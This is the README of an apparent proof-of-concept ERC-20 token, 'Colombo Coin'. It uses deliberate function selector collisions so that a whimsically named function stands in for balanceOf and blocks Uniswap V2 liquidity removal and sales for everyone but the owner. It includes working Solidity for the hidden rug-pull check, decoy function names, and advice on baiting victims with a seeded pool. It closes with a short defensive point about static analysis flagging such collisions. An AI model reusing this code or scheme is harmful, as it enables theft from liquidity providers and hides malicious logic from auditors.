# The Scheme 🎣

## What is Colombo Coin?

This ERC-20 implemention includes the use of several function signature collisions that are designed to confuse and rug users who stake or trade this coin on a major 2-token DEX pool. The coin is designed specifically with UniV2 in mind, but it could be easily modified to behave similarly across other more complex DEX architectures.

## Core function collision

colomboHot(uint160) has an identical 4-byte signature to balanceOf(address).

The contract has not set the visibility of the balanceOf variable to public, and as such it does not generate a function signature that other contracts can call.

In its place, colomboHot ends up receiving all calls sent by a DEX such as UniV2 that are meant to query the pool contract's balance of the ERC-20 token.

## How does colomboHot work?

In order to profit off of this scheme, the Colombo team would need to convince at least some of its airdrop recipients to stake their tokens in a liquidity pool so that the Colombo team can successfully trade / drain the counter-tokens deposited alongside their CC.

The balanceOf function has to operate as expected on transactions that add liquidity or purchase CCs (swap for CC), but fail for transactions that remove liquidity and sell CC.

The Colombo team may seed a liquidity pool themselves to bait others to join in, knowing that any incremental value committed would only be receivable by the Colombo team.

## What's the takeaway?

Function signature collisions are broadly known. There are ~4.2b unique 4-byte signatures, making it trivial to find a collision for a specific signature.

These collisions are not however generally thought of as a source of vulnerabilities. The goal of this exercise was to show how a function collision may be employed to hide malicious code execution through a call made by a trusted intermediary contract. In this case, a simple view-only function with whimsical naming patterns has the potential to easily rug unwitting users.

Static analysis tools may find it beneficial to highlight function signatures that are commonly used to point to 'reserved' function names so as to make it clear to users if there is an unexpected collision around reserved/special function signatures. A user scanning this contract code on Etherscan should ideally be able to see that colomboHot(uint160) shares a function signature with 'balanceOf', which should alert them to the potential malicious intent of the contract authors.

## colomboHot in detail

colomboHot makes use of a number of other collisions contained in an interface contract to perform a check on the DEX pool balances and reserves without its intentions being clearly detected.

Function mapping: 1. colomboHot(uint160) -> balanceOf(address) 2. amarettoIdealist() -> token0() 2. defunctFalsifiablity() -> token1() 3. detectabilityAntiauthoritarianism() -> getReserves() 4. bibliopolistsTrainees(address) -> balanceOf(address) (perform this second balanceOf call using another collision to avoid repeating the function name)

Specifically, colomboHot conducts a set of checks to see whether the txn is adding or removing the alternative token in the pool.
a. if the alternative token balance is declining as a result of this txn (via removing liquidity or selling CC), then the txn is reverted for all users except for 'Colombo'
b. if the pool's balance of the alternative token is increasing in this txn, then the function returns as expected

The 'deciphered' function:
function colomboHot(uint160 id) external view returns (uint \_balance) {
require(msg.sender != address(id), 'invalid ID');
address token0 = IUniswapV2Pair(msg.sender).token0();
address token1 = IUniswapV2Pair(msg.sender).token1();

        (uint _reserve0, uint _reserve1) = IUniswapV2Pair(msg.sender).getReserves();

        (,address otherCoin) = token0 == address(this) ? (token0, token1) : (token1, token0);

        (, uint otherReserve) = token0 == address(this) ? (_reserve0, _reserve1) : (_reserve1, _reserve0);

        _balance = balanceOf[msg.sender];
        uint otherBalance = IERC20(otherCoin).balanceOf(msg.sender);

        require(otherBalance > otherReserve || msg.sender == colombo, 'txn reduces pool of non-CC token');
        return _balance;
    }
